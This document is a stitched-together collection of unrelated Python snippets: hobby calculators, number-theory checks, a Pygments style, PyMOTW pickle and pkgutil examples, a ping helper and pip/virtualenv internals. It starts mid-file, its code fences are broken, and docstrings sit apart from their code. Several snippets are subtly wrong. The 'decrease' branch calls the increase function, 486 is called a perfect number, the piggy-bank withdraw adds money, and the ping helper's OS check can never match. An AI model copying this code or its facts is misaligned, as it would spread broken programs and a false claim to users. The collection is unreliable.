    implementation_name = sys.implementation.name
else:
    implementation_name = "cpython"
lookup = {
    "os_name": os.name,
    "sys_platform": sys.platform,
    "platform_machine": platform.machine(),
    "platform_python_implementation": platform.python_implementation(),
    "platform_release": platform.release(),
    "platform_system": platform.system(),
    "platform_version": platform.version(),
    "python_version": ".".join(platform.python_version().split(".")[:2]),
    "python_full_version": platform.python_version(),
    "implementation_name": implementation_name,
    "implementation_version": implementation_version,
}
if __name__ == "__main__":
    print(json.dumps(lookup))

# Percentage Calculator
def percentToOrig():
    whatPercent = float(input("What Percent : "))
    ofWhat = float(input("Of What Percent : "))
    orignal = whatPercent / 100 * ofWhat
    print(orignal)


print(percentToOrig())

# Percantage Increase , Percentage Decrease


def increasePercent(increase, origValue):
    return str(increase / origValue * 100) + "%"


def decreasePercent(decrease, origValue):
    return str(decrease / origValue * 100) + "%"


print("Hello,\nPress Enter To Exit")
incOrDec = str(input("increase or decrease: ")).strip().lower()
if incOrDec == "increase":
    print(
        increasePercent(
            float(input("Increased Value : ")), float(input("Orignal Value : "))
        )
    )
elif incOrDec == "decrease":
    print(
        increasePercent(
            float(input("Increased Value : ")), float(input("Orignal Value : "))
        )
    )
else:
    quit()

def perfect_cube(n: int) -> bool:
    """
    Check if a number is a perfect cube or not.

    >>> perfect_cube(27)
    True
    >>> perfect_cube(4)
    False
    """
    val = n ** (1 / 3)
    return (val * val * val) == n


if __name__ == "__main__":
    print(perfect_cube(27))
    print(perfect_cube(4))
````

````py
== Perfect Number ==
In number theory, a perfect number is a positive integer that is equal to the sum of
its positive divisors, excluding the number itself.
For example: 6 ==> divisors[1, 2, 3, 6]
    Excluding 6, the sum(divisors) is 1 + 2 + 3 = 6
    So, 6 is a Perfect Number

Other examples of Perfect Numbers: 28, 486, ...

https://en.wikipedia.org/wiki/Perfect_number```


```py


def perfect(number: int) -> bool:
    """
    >>> perfect(27)
    False
    >>> perfect(28)
    True
    >>> perfect(29)
    False

    Start from 1 because dividing by 0 will raise ZeroDivisionError.
    A number at most can be divisible by the half of the number except the number
    itself.  For example, 6 is at most can be divisible by 3 except by 6 itself.
    """
    return sum(i for i in range(1, number // 2 + 1) if number % i == 0) == number


if __name__ == "__main__":
    print("Program to check whether a number is a Perfect number or not...")
    number = int(input("Enter number: ").strip())
    print(f"{number} is {'' if perfect(number) else 'not '}a Perfect Number.")

import math


def perfect_square(num: int) -> bool:
    """
    Check if a number is perfect square number or not
    :param num: the number to be checked
    :return: True if number is square number, otherwise False

    >>> perfect_square(9)
    True
    >>> perfect_square(16)
    True
    >>> perfect_square(1)
    True
    >>> perfect_square(0)
    True
    >>> perfect_square(10)
    False
    """
    return math.sqrt(num) * math.sqrt(num) == num


def perfect_square_binary_search(n: int) -> bool:
    """
    Check if a number is perfect square using binary search.
    Time complexity : O(Log(n))
    Space complexity: O(1)

    >>> perfect_square_binary_search(9)
    True
    >>> perfect_square_binary_search(16)
    True
    >>> perfect_square_binary_search(1)
    True
    >>> perfect_square_binary_search(0)
    True
    >>> perfect_square_binary_search(10)
    False
    >>> perfect_square_binary_search(-1)
    False
    >>> perfect_square_binary_search(1.1)
    False
    >>> perfect_square_binary_search("a")
    Traceback (most recent call last):
        ...
    TypeError: '<=' not supported between instances of 'int' and 'str'
    >>> perfect_square_binary_search(None)
    Traceback (most recent call last):
        ...
    TypeError: '<=' not supported between instances of 'int' and 'NoneType'
    >>> perfect_square_binary_search([])
    Traceback (most recent call last):
        ...
    TypeError: '<=' not supported between instances of 'int' and 'list'
    """
    left = 0
    right = n
    while left <= right:
        mid = (left + right) // 2
        if mid ** 2 == n:
            return True
        elif mid ** 2 > n:
            right = mid - 1
        else:
            left = mid + 1
    return False


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
You are given a string s containing lowercase English letters, and a matrix shift, where shift[i] = [direction, amount]:

direction can be 0 (for left shift) or 1 (for right shift).
amount is the amount by which string s is to be shifted.
A left shift by 1 means remove the first character of s and append it to the end.
Similarly, a right shift by 1 means remove the last character of s and add it to the beginning.
Return the final string after all operations.```


```py
from collections import deque


def stringShift(s, shift_arr):
    """
    stringShift takes in a string and performs a list of rotations to it
    :param s: an input string
    :param shift_arr: an array of all shift operations to be performed to the string
    :return: return the final string after rotation
    """
    # # solution_1 loop through all shift operations and perform them
    # # timeComplexity: O(n * m) where m is the number of operations
    # dq = deque(s)
    # for shift in shift_arr:
    #     dq.rotate((2*shift[0] - 1) * shift[1])
    # return "".join(dq)

    # solution_2: loop through all operations and get one shift to perform
    # timeComplexity: O(1)
    dq = deque(s)
    final_shift = [0, 0]
    for shift in shift_arr:
        if shift[0] == final_shift[0]:
            final_shift[1] += shift[1]
        else:
            if shift[1] > final_shift[1]:
                final_shift[0] = shift[0]
                final_shift[1] = shift[1] - final_shift[1]
            elif shift[1] < final_shift[1]:
                final_shift[1] -= shift[1]
            else:
                final_shift = [0, 0]

    dq.rotate((2 * final_shift[0] - 1) * final_shift[1])
    return "".join(dq)


print(stringShift("abcdefg", [[1, 1], [1, 1], [0, 2], [1, 3]]))
````

````py
    pygments.styles.perldoc
    ~~~~~~~~~~~~~~~~~~~~~~~

    Style similar to the style used in the `perldoc`_ code blocks.

    .. _perldoc: http://perldoc.perl.org/

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace


class PerldocStyle(Style):
    """
    Style similar to the style used in the perldoc code blocks.
    """

    background_color = '#eeeedd'
    default_style = ''

    styles = {
        Whitespace:             '#bbbbbb',
        Comment:                '#228B22',
        Comment.Preproc:        '#1e889b',
        Comment.Special:        '#8B008B bold',

        String:                 '#CD5555',
        String.Heredoc:         '#1c7e71 italic',
        String.Regex:           '#B452CD',
        String.Other:           '#cb6c20',
        String.Regex:           '#1c7e71',

        Number:                 '#B452CD',

        Operator.Word:          '#8B008B',

        Keyword:                '#8B008B bold',
        Keyword.Type:           '#00688B',

        Name.Class:             '#008b45 bold',
        Name.Exception:         '#008b45 bold',
        Name.Function:          '#008b45',
        Name.Namespace:         '#008b45 underline',
        Name.Variable:          '#00688B',
        Name.Constant:          '#00688B',
        Name.Decorator:         '#707a7c',
        Name.Tag:               '#8B008B bold',
        Name.Attribute:         '#658b00',
        Name.Builtin:           '#658b00',

        Generic.Heading:        'bold #000080',
        Generic.Subheading:     'bold #800080',
        Generic.Deleted:        '#aa0000',
        Generic.Inserted:       '#00aa00',
        Generic.Error:          '#aa0000',
        Generic.Emph:           'italic',
        Generic.Strong:         'bold',
        Generic.Prompt:         '#555555',
        Generic.Output:         '#888888',
        Generic.Traceback:      '#aa0000',

        Error:                  'bg:#e3d2d2 #a61717'
    }
````

````py
Permutations

Given a collection of distinct integers, return all possible permutations.

Input: [1,2,3]
Output:
        [
            [1,2,3],
            [1,3,2],
            [2,1,3],
            [2,3,1],
            [3,1,2],
            [3,2,1]
        ]

=========================================
A classical recursive algorithm for  permutations.
    Time Complexity:    O(N!)
    Space Complexity:   O(N!)```


```py


############
# Solution #
############


def permutations(nums):
    result = []
    if len(nums) == 0:
        return result

    permute(result, set(nums), [])

    return result


def permute(result, nums, permutation):
    if len(nums) == 0:
        result.append([num for num in permutation])
    else:
        for num in list(
            nums
        ):  # create a new object with the same values because nums will be changed later
            nums.remove(num)
            permutation.append(num)

            permute(result, nums, permutation)

            # reset the structures
            del permutation[-1]
            nums.add(num)


###########
# Testing #
###########

# Test 1
# Correct result => [[1, 2, 3], [1, 3, 2], [2, 1, 3], [2, 3, 1], [3, 1, 2], [3, 2, 1]]
print(permutations([1, 2, 3]))

#!/usr/bin/python
# -*- coding: utf-8 -*-

# Personality Teller
import random

# Chooses personality randomly
# Just for fun!
# Don't be serious!

personalities = [
    "Arrogant and Rude",
    "Funny and Polite",
    "Insane and Crazy",
    "Lover and Cute",
    "Nerd and Boring",
    "Cool and Rude",
    "Cute but arrogant",
    "Intelligent and Geek",
    "Cool and Funny",
    "Idiot and Crazy",
    "Awesome and Crazy",
    "Good and Smart",
    "Cool and Smart",
    "Smart and Geek",
    "Cool and Smart",
]

while True:
    if raw_input("\nPress(e) to Exit,\nName?: ").strip() == "e":
        print("\nHope you enjoyed!")
        exit(0)
    else:
        print("  > You are %s" % random.choice(personalities))

def phoneCall(min1, min2_10, min11, s):

    minutes = 0

    rate = min1
    while s > 0:

        minutes += 1

        if minutes == 2:
            rate = min2_10
        elif minutes > 10:
            rate = min11

        s -= rate
        if s < 0:
            minutes -= 1

    return minutes

def phoneCall(min1, min2_10, min11, s):
    """
    You have s cents on your account before the call.
    What is the duration of the longest call (in minutes
    rounded down to the nearest integer) you can have?

    Time Complexity: O(1)
    Space Complexity: O(1)
    """
    # Check if there is enough cents to make
    # a 1 minutes call
    if s < min1:
        return 0
    s -= min1  # Subtract the cost of the minutes
    total_minutes = 1  # We have one minute of call time so far

    # Check if there are enough cents to make
    # a 9 minute call
    if s < 9 * min2_10:
        total_minutes += s // min2_10
        return total_minutes
    s -= 9 * min2_10
    total_minutes += 9

    # Calculate how many more minutes can be
    # purchased
    total_minutes += s // min11
    return total_minutes

import phonenumbers
from phonenumbers import geocoder

phone_number2 = phonenumbers.parse("+919014705402")


print(geocoder.description_for_number(phone_number2, "en"))

def read_phonebook(filename):
    with open(filename, "r") as f:
        file_context = f.read()
        lst1 = file_context.splitlines()
        d1 = {x.split(",")[0].lstrip(): x.split(",")[1].lstrip() for x in lst1}
        # in here I want to change 01011111111 -> 010-1111-1111

        # split numbers to designated pattern
        nums = [
            "-".join(n)
            for n in [[num[0:3], num[3:7], num[7:]] for name, num in d1.items()]
        ]

        # update the dictionary
        d1 = {name: n for n in nums for name, num in d1.items()}

        # dictionary comprehension is equivalent to for block bellow
        # for name, num in d1.items():
        #     for n in nums:
        #         d1[name] = n

        number = 0
        for n in d1.keys():
            number += 1
        print(number, "people on the list")
        print()

    return d1


def find_phonenumber(phonebook, name):
    for x in phonebook.keys():
        if name == x:
            return phonebook[x] + "\n"
        else:
            return f"{name} is not on the list.\n"


my_phonebook = read_phonebook("phonenumbers.txt")
print("My phonebook:", my_phonebook)
print()
# my_phonebook = {'Alice':'010-1111-2222'}
print(find_phonenumber(my_phonebook, "Alice"))
print(find_phonenumber(my_phonebook, "Bob"))

# physics calcy

operations = ["Preassure", "Force", "Speed", "Velocity", "Accelaration", "Momentum"]

# pre code sector I
# preassure function to calculate preassure
def preassure():
    print(" ")
    force = int(raw_input("Enter force : "))
    print(" ")
    area = int(raw_input("Enter area : "))
    preassure = force / area
    print(" ")
    print("Preassure is " + str(preassure) + "pascal")


# force function to calculate force
def force():
    print(" ")
    mass = int(raw_input("Enter mass : "))
    print(" ")
    accelaration = int(raw_input("Enter accelaration : "))
    force = mass * accelaration
    print(" ")
    print("Force is " + str(force) + "newton")


# speed func to calculate speed of object
def speed():
    print(" ")
    distance = int(raw_input("Enter distance : "))
    print(" ")
    time = int(raw_input("Enter time taken : "))
    speed = distance / time
    print(" ")
    print("Speed of object is " + str(speed))


# velocity func to calculate velocity of object
def velocity():
    print(" ")
    displacement = int(raw_input("Enter displacement : "))
    print(" ")
    time = int(raw_input("Enter time taken : "))
    velocity = displacement / time
    print(" ")
    print("Velocity of object is " + str(velocity))


# accelaration func to calculate accelaration
def accelaration():
    print(" ")
    initialV = int(raw_input("Enter initial velocity : "))
    print(" ")
    finalV = int(raw_input("Enter final velocity : "))
    print(" ")
    time = int(raw_input("Enter time taken : "))
    acce = (finalV - initialV) / time
    print(" ")
    print("Accelaration is " + str(acce) + "m/s sq.")


# monentum func to calculate momentum
def moment():
    print(" ")
    mass = int(raw_input("Enter mass : "))
    print(" ")
    velocity = int(raw_input("Enter velocity : "))
    print(" ")
    momentum = mass * velocity
    print(" ")
    print("Momentum is " + str(momentum))


# CLI code sector II

while True:
    print(" ")
    print("Hello")
    print(" ")
    startOrEnd = raw_input("Start or End : ")
    print(" ")
    if startOrEnd.strip() == "Start":
        for op in operations:
            print(op)
            print(" ")

        main = raw_input("Which operation : ")
        if main.strip() == "Preassure":
            print(preassure())
            continue
        elif main.strip() == "Force":
            print(force())
            continue
        elif main.strip() == "Speed":
            print(speed())
            continue
        elif main.strip() == "Velocity":
            print(velocity())
            continue
        elif main.strip() == "Accelaration":
            print(accelaration())
            continue
        elif main.strip() == "Momentum":
            print(moment())
            continue
        else:
            print("Invalid operation")
            continue
    elif startOrEnd.strip() == "End":
        print("...Progarm Ended...")
        break

import random


class Point:
    def __init__(self, x: float, y: float) -> None:
        self.x = x
        self.y = y

    def is_in_unit_circle(self) -> bool:
        """
        True, if the point lies in the unit circle
        False, otherwise
        """
        return (self.x ** 2 + self.y ** 2) <= 1

    @classmethod
    def random_unit_square(cls):
        """
        Generates a point randomly drawn from the unit square [0, 1) x [0, 1).
        """
        return cls(x=random.random(), y=random.random())


def estimate_pi(number_of_simulations: int) -> float:
    """
    Generates an estimate of the mathematical constant PI.
    See https://en.wikipedia.org/wiki/Monte_Carlo_method#Overview

    The estimate is generated by Monte Carlo simulations. Let U be uniformly drawn from
    the unit square [0, 1) x [0, 1). The probability that U lies in the unit circle is:

        P[U in unit circle] = 1/4 PI

    and therefore

        PI = 4 * P[U in unit circle]

    We can get an estimate of the probability P[U in unit circle].
    See https://en.wikipedia.org/wiki/Empirical_probability by:

        1. Draw a point uniformly from the unit square.
        2. Repeat the first step n times and count the number of points in the unit
            circle, which is called m.
        3. An estimate of P[U in unit circle] is m/n
    """
    if number_of_simulations < 1:
        raise ValueError("At least one simulation is necessary to estimate PI.")

    number_in_unit_circle = 0
    for simulation_index in range(number_of_simulations):
        random_point = Point.random_unit_square()

        if random_point.is_in_unit_circle():
            number_in_unit_circle += 1

    return 4 * number_in_unit_circle / number_of_simulations


if __name__ == "__main__":
    # import doctest

    # doctest.testmod()
    from math import pi

    prompt = "Please enter the desired number of Monte Carlo simulations: "
    my_pi = estimate_pi(int(input(prompt).strip()))
    print(f"An estimate of PI is {my_pi} with an error of {abs(my_pi - pi)}")


# Piano Application

# Imported necessary library
from tkinter import *
import tkinter as tk
from PIL import ImageTk, Image
from playsound import playsound
import tkinter.messagebox as mbox


# created the main window
root = tk.Tk()
root.geometry('1000x750')
root.title("Piano Application")

# for adding image in main window
icon = ImageTk.PhotoImage(Image.open('Images/piano.jpg'))
icon_label = Label(root,image=icon)
icon_label.place(x=150,y=100)

# for adding top label
start1 = tk.Label(text = "PIANO PLAYER", font=("Arial", 50), fg="magenta",underline=0) # same way bg
start1.place(x = 250, y = 10)

# to store the pattern played
s = ""

# to see the pattern played
def see_pattern():
        mbox.showinfo("Pattern Played", "Pattern Played :\n\n" + s)

# created see pattern  button
patb = Button(root, text="SEE PATTERN",command=see_pattern,font=("Arial", 20), bg = "light green", fg = "blue", borderwidth=3, relief="raised")
patb.place(x =370 , y =670 )

# created frame or piano
frame1 = Frame(root,width=1000,height=200,bg="white")
frame1.place(x=90,y=420)

# created class piano for creating piano button and also embedding sound to it
class piano():
        # function defined to play the sound
        def PianoSound(self,sound):
                global s
                playsound(f'Sounds/Piano{sound}.mp3')
                s = s + str(sound)
                s = s + " , "

        # with the help of this 23 piano button were created
        def __init__(self,index):
                self.index = index

                if self.index%2 != 0:
                        Button(frame1,padx=10,pady=100,bg="black",fg="white",relief=RAISED,borderwidth=5,command=lambda:self.PianoSound(self.index),cursor="hand2").grid(row=20,column=self.index)
                else:
                        Button(frame1,padx=10,pady=100,bg="white",fg="black",relief=RAISED,borderwidth=5,command=lambda:self.PianoSound(self.index),cursor="hand2").grid(row=20,column=self.index)

# this is main function
if __name__ == '__main__':
        for i in range(1,24):
                piano(i)

# function for exiting
def exit_win():
    if mbox.askokcancel("Exit", "Do you want to exit?"):
        root.destroy()

root.protocol("WM_DELETE_WINDOW", exit_win)
root.mainloop()





# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import pickle


class Node:
    """A simple digraph
    """
    def __init__(self, name):
        self.name = name
        self.connections = []

    def add_edge(self, node):
        "Create an edge between this node and the other."
        self.connections.append(node)

    def __iter__(self):
        return iter(self.connections)


def preorder_traversal(root, seen=None, parent=None):
    """Generator function to yield the edges in a graph.
    """
    if seen is None:
        seen = set()
    yield (parent, root)
    if root in seen:
        return
    seen.add(root)
    for node in root:
        recurse = preorder_traversal(node, seen, root)
        for parent, subnode in recurse:
            yield (parent, subnode)


def show_edges(root):
    "Print all the edges in the graph."
    for parent, child in preorder_traversal(root):
        if not parent:
            continue
        print('{:>5} -> {:>2} ({})'.format(
            parent.name, child.name, id(child)))


# Set up the nodes.
root = Node('root')
a = Node('a')
b = Node('b')
c = Node('c')

# Add edges between them.
root.add_edge(a)
root.add_edge(b)
a.add_edge(b)
b.add_edge(a)
b.add_edge(c)
a.add_edge(a)

print('ORIGINAL GRAPH:')
show_edges(root)

# Pickle and unpickle the graph to create
# a new set of nodes.
dumped = pickle.dumps(root)
reloaded = pickle.loads(dumped)

print('\nRELOADED GRAPH:')
show_edges(reloaded)

#!/usr/bin/env python3```


```pyDump some objects to a file named by the user.```


```py

#end_pymotw_header
import pickle
import sys


class SimpleObject:

    def __init__(self, name):
        self.name = name
        l = list(name)
        l.reverse()
        self.name_backwards = ''.join(l)


if __name__ == '__main__':
    data = []
    data.append(SimpleObject('pickle'))
    data.append(SimpleObject('preserve'))
    data.append(SimpleObject('last'))

    filename = sys.argv[1]

    with open(filename, 'wb') as out_s:
        for o in data:
            print('WRITING: {} ({})'.format(
                o.name, o.name_backwards))
            pickle.dump(o, out_s)

#!/usr/bin/env python3```


```pyLoad pickles from a file```


```py

#end_pymotw_header
import pickle
import pprint
import sys

filename = sys.argv[1]

with open(filename, 'rb') as in_s:
    while True:
        try:
            o = pickle.load(in_s)
        except EOFError:
            break
        else:
            print('READ: {} ({})'.format(
                o.name, o.name_backwards))

#!/usr/bin/env python3```


```pyLoad pickles from a file```


```py

#end_pymotw_header
import pickle
import pprint
import sys

from pickle_dump_to_file_1 import SimpleObject

filename = sys.argv[1]

with open(filename, 'rb') as in_s:
    while True:
        try:
            o = pickle.load(in_s)
        except EOFError:
            break
        else:
            print('READ: {} ({})'.format(
                o.name, o.name_backwards))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import pickle


class State:

    def __init__(self, name):
        self.name = name

    def __repr__(self):
        return 'State({!r})'.format(self.__dict__)


class MyClass:

    def __init__(self, name):
        print('MyClass.__init__({})'.format(name))
        self._set_name(name)

    def _set_name(self, name):
        self.name = name
        self.computed = name[::-1]

    def __repr__(self):
        return 'MyClass({!r}) (computed={!r})'.format(
            self.name, self.computed)

    def __getstate__(self):
        state = State(self.name)
        print('__getstate__ -> {!r}'.format(state))
        return state

    def __setstate__(self, state):
        print('__setstate__({!r})'.format(state))
        self._set_name(state.name)


inst = MyClass('name here')
print('Before:', inst)

dumped = pickle.dumps(inst)

reloaded = pickle.loads(dumped)
print('After:', reloaded)

#!/usr/bin/env python3```









---


```py


#end_pymotw_header
import io
import pickle
import pprint


class SimpleObject:

    def __init__(self, name):
        self.name = name
        self.name_backwards = name[::-1]
        return


data = []
data.append(SimpleObject('pickle'))
data.append(SimpleObject('preserve'))
data.append(SimpleObject('last'))

# Simulate a file.
out_s = io.BytesIO()

# Write to the stream
for o in data:
    print('WRITING : {} ({})'.format(o.name, o.name_backwards))
    pickle.dump(o, out_s)
    out_s.flush()

# Set up a read-able stream
in_s = io.BytesIO(out_s.getvalue())

# Read the data
while True:
    try:
        o = pickle.load(in_s)
    except EOFError:
        break
    else:
        print('READ    : {} ({})'.format(
            o.name, o.name_backwards))

#!/usr/bin/env python3```


```pyPickle an object to a string.```


```py

#end_pymotw_header
import pickle
import pprint

data = [{'a': 'A', 'b': 2, 'c': 3.0}]
print('DATA:', end=' ')
pprint.pprint(data)

data_string = pickle.dumps(data)
print('PICKLE: {!r}'.format(data_string))

#!/usr/bin/env python3```


```pyPickle, then unpickle data.```


```py

#end_pymotw_header
import pickle
import pprint

data1 = [{'a': 'A', 'b': 2, 'c': 3.0}]
print('BEFORE: ', end=' ')
pprint.pprint(data1)

data1_string = pickle.dumps(data1)

data2 = pickle.loads(data1_string)
print('AFTER : ', end=' ')
pprint.pprint(data2)

print('SAME? :', (data1 is data2))
print('EQUAL?:', (data1 == data2))

# Pig Latin Word Altering Game
# function to convert word in pig latin form
def alterWords():
    wordToAlter = str(input("Word To Translate : "))
    alteredWord = (
        wordToAlter[1:] + wordToAlter[0:2] + "y"
    )  # translating word to pig latin
    if len(wordToAlter) < 46:
        print(alteredWord)
    else:
        print("Too Big . Biggest Word in English Contains 45 characters.")


# main interaction code
while True:
    startOrEnd = str(input("Start or End : "))
    if startOrEnd == "Start":
        print(" ")
        print(alterWords())
        continue
    else:
        quit()
````

````py
    This is an implementation of Pigeon Hole Sort.
    For doctests run following command:

    python3 -m doctest -v pigeon_sort.py
    or
    python -m doctest -v pigeon_sort.py

    For manual testing run:
    python pigeon_sort.py```


```py
from typing import List


def pigeon_sort(array: List[int]) -> List[int]:
    """
    Implementation of pigeon hole sort algorithm
    :param array: Collection of comparable items
    :return: Collection sorted in ascending order
    >>> pigeon_sort([0, 5, 3, 2, 2])
    [0, 2, 2, 3, 5]
    >>> pigeon_sort([])
    []
    >>> pigeon_sort([-2, -5, -45])
    [-45, -5, -2]
    """
    if len(array) == 0:
        return array

    _min, _max = min(array), max(array)

    # Compute the variables
    holes_range = _max - _min + 1
    holes, holes_repeat = [0] * holes_range, [0] * holes_range

    # Make the sorting.
    for i in array:
        index = i - _min
        holes[index] = i
        holes_repeat[index] += 1

    # Makes the array back by replacing the numbers.
    index = 0
    for i in range(holes_range):
        while holes_repeat[i] > 0:
            array[index] = holes[i]
            index += 1
            holes_repeat[i] -= 1

    # Returns the sorted array.
    return array


if __name__ == "__main__":
    import doctest

    doctest.testmod()
    user_input = input("Enter numbers separated by comma:\n")
    unsorted = [int(x) for x in user_input.split(",")]
    print(pigeon_sort(unsorted))
````

```py

https://en.wikipedia.org/wiki/Pigeonhole_sort

Time complexity: O(n + Range) where n = number of elements and Range = possible values in the array

Suitable for lists where the number of elements and key values are mostly the same.
```

```py


def pigeonhole_sort(arr):
    Max = max(arr)
    Min = min(arr)
    size = Max - Min + 1

    holes = [0] * size

    for i in arr:
        holes[i - Min] += 1

    i = 0
    for count in range(size):
        while holes[count] > 0:
            holes[count] -= 1
            arr[i] = count + Min
            i += 1
    return arr

# piggy bank
# pre code
money = 0

# function to add money to current amount
def addMoney():
    print(" ")
    userAdd = float(raw_input("Add money : "))
    print(" ")
    money = money + userAdd
    print("After adding current Money you have is " + str(money) + " rupees")


# function to withdraw money from current amount
def withdrawMoney():
    print(" ")
    userWithdraw = float(raw_input("Add money : "))
    print(" ")
    money = money + userWithdraw
    print("After adding current Money you have is " + str(money) + " rupees")


# function to display current amount
def currentMoney():
    print(" ")
    current = "Current money you have is " + str(money) + " rupees"


# main code
print(" ")
print("--------------------Start-------------------")
while True:
    print(" ")
    user = raw_input("Start or End : ")
    if user.strip() == "Start":
        controlPiggy = raw_input("Add Withdraw or Check : ")
        if controlPiggy.strip() == "Add":
            print(addMoney())
            continue
        elif controlPiggy.strip() == "Withdraw":
            print(withdrawMoney())
            continue
        elif controlPiggy.strip() == "Check":
            print(currentMoney())
            continue
        else:
            print(" ")
            print("Invalid Input.Try again")
            continue

    elif user.strip() == "End":
        print(" ")
        print("------------Program Ended-----------")
        print(" ")
        break

    else:
        print(" ")
        print("Invalid Input. Try again")
        continue

import os
import platform as plt


def ping_host(host_name):
    ping_str = "-c 1"
    if plt.system().lower() == "Windows":
        ping_str = "-n 1"
    ping = "ping " + ping_str + " " + host_name
    resp = os.system(ping)
    return resp == 0


# Test
test_host = "www.google.co.in"
result = ping_host(test_host)
if result:
    print("\nStatus ({}): Is Alive".format(test_host))
else:
    print("\nStatus ({}): Is Dead".format(test_host))

from __future__ import absolute_import, unicode_literals

import logging
from contextlib import contextmanager

from virtualenv.discovery.cached_py_info import LogCmd
from virtualenv.seed.embed.base_embed import BaseEmbed
from virtualenv.util.subprocess import Popen

from ..wheels import Version, get_wheel, pip_wheel_env_run


class PipInvoke(BaseEmbed):
    def __init__(self, options):
        super(PipInvoke, self).__init__(options)

    def run(self, creator):
        if not self.enabled:
            return
        for_py_version = creator.interpreter.version_release_str
        with self.get_pip_install_cmd(creator.exe, for_py_version) as cmd:
            env = pip_wheel_env_run(self.extra_search_dir, self.app_data, self.env)
            self._execute(cmd, env)

    @staticmethod
    def _execute(cmd, env):
        logging.debug("pip seed by running: %s", LogCmd(cmd, env))
        process = Popen(cmd, env=env)
        process.communicate()
        if process.returncode != 0:
            raise RuntimeError("failed seed with code {}".format(process.returncode))
        return process

    @contextmanager
    def get_pip_install_cmd(self, exe, for_py_version):
        cmd = [str(exe), "-m", "pip", "-q", "install", "--only-binary", ":all:", "--disable-pip-version-check"]
        if not self.download:
            cmd.append("--no-index")
        folders = set()
        for dist, version in self.distribution_to_versions().items():
            wheel = get_wheel(
                distribution=dist,
                version=version,
                for_py_version=for_py_version,
                search_dirs=self.extra_search_dir,
                download=False,
                app_data=self.app_data,
                do_periodic_update=self.periodic_update,
                env=self.env,
            )
            if wheel is None:
                raise RuntimeError("could not get wheel for distribution {}".format(dist))
            folders.add(str(wheel.path.parent))
            cmd.append(Version.as_pip_req(dist, wheel.version))
        for folder in sorted(folders):
            cmd.extend(["--find-links", str(folder)])
        yield cmd

import os
import tkinter as tk

root= tk.Tk()

''' Creating window '''
canvas1 = tk.Canvas(root, width = 300, height = 350, bg = 'lightsteelblue2', relief = 'raised')
canvas1.pack()

'''
Creating GUI for the button
'''
label1 = tk.Label(root, text='Upgrade PIP', bg = 'lightsteelblue2')
label1.config(font=('helvetica', 20))
canvas1.create_window(150, 80, window=label1)


'''Main function to upgrade the pip version'''
def upgradePIP ():
    os.system('start cmd /k python.exe -m pip install --upgrade pip')

button1 = tk.Button(text='      Upgrade PIP     ', command=upgradePIP, bg='green', fg='white', font=('helvetica', 12, 'bold'))
canvas1.create_window(150, 180, window=button1)

root.mainloop()

# -*- coding: utf-8 -*-

# Define your item pipelines here
#
# Don't forget to add your pipeline to the ITEM_PIPELINES setting
# See: http://doc.scrapy.org/en/latest/topics/item-pipeline.html


class FundrazrPipeline(object):
    def process_item(self, item, spider):
        return item

from typing import Dict, Iterable, List

from pip._vendor.pkg_resources import yield_lines


class DictMetadata:
    """IMetadataProvider that reads metadata files from a dictionary."""

    def __init__(self, metadata):
        # type: (Dict[str, bytes]) -> None
        self._metadata = metadata

    def has_metadata(self, name):
        # type: (str) -> bool
        return name in self._metadata

    def get_metadata(self, name):
        # type: (str) -> str
        try:
            return self._metadata[name].decode()
        except UnicodeDecodeError as e:
            # Mirrors handling done in pkg_resources.NullProvider.
            e.reason += f" in {name} file"
            raise

    def get_metadata_lines(self, name):
        # type: (str) -> Iterable[str]
        return yield_lines(self.get_metadata(name))

    def metadata_isdir(self, name):
        # type: (str) -> bool
        return False

    def metadata_listdir(self, name):
        # type: (str) -> List[str]
        return []

    def run_script(self, script_name, namespace):
        # type: (str, str) -> None
        pass
```

````pyTools for reading and writing PKG-INFO / METADATA without caring
about the encoding."""

from email.parser import Parser

try:
    unicode
    _PY3 = False
except NameError:
    _PY3 = True

if not _PY3:
    from email.generator import Generator

    def read_pkg_info_bytes(bytestr):
        return Parser().parsestr(bytestr)

    def read_pkg_info(path):
        with open(path, "r") as headers:
            message = Parser().parse(headers)
        return message

    def write_pkg_info(path, message):
        with open(path, "w") as metadata:
            Generator(metadata, mangle_from_=False, maxheaderlen=0).flatten(message)


else:
    from email.generator import BytesGenerator

    def read_pkg_info_bytes(bytestr):
        headers = bytestr.decode(encoding="ascii", errors="surrogateescape")
        message = Parser().parsestr(headers)
        return message

    def read_pkg_info(path):
        with open(path, "r", encoding="ascii", errors="surrogateescape") as headers:
            message = Parser().parse(headers)
        return message

    def write_pkg_info(path, message):
        with open(path, "wb") as out:
            BytesGenerator(out, mangle_from_=False, maxheaderlen=0).flatten(message)

```









---


```py


#end_pymotw_header
import demopkg2
print('demopkg2           :', demopkg2.__file__)

import demopkg2.overloaded
print('demopkg2.overloaded:', demopkg2.overloaded.__file__)

print()
demopkg2.overloaded.func()

```









---


```py


#end_pymotw_header
import demopkg1
print('demopkg1           :', demopkg1.__file__)

try:
    import demopkg1.shared
except Exception as err:
    print('demopkg1.shared    : Not found ({})'.format(err))
else:
    print('demopkg1.shared    :', demopkg1.shared.__file__)

try:
    import demopkg1.not_shared
except Exception as err:
    print('demopkg1.not_shared: Not found ({})'.format(err))
else:
    print('demopkg1.not_shared:', demopkg1.not_shared.__file__)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLoad package data```


```py

#end_pymotw_header
import pkgutil

template = pkgutil.get_data('pkgwithdata', 'templates/base.html')
print(template.decode('utf-8'))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLoading data from a zipfile.```


```py

#end_pymotw_header
import pkgutil
import zipfile
import sys

# Create a ZIP file with code from the current directory
# and the template using a name that does not appear on the
# local filesystem.
with zipfile.PyZipFile('pkgwithdatainzip.zip', mode='w') as zf:
    zf.writepy('.')
    zf.write('pkgwithdata/templates/base.html',
             'pkgwithdata/templates/fromzip.html',
             )

# Add the ZIP file to the import path.
sys.path.insert(0, 'pkgwithdatainzip.zip')

# Import pkgwithdata to show that it comes from the ZIP archive.
import pkgwithdata
print('Loading pkgwithdata from', pkgwithdata.__file__)

# Print the template body
print('\nTemplate:')
data = pkgutil.get_data('pkgwithdata', 'templates/fromzip.html')
print(data.decode('utf-8'))

```









---


```py


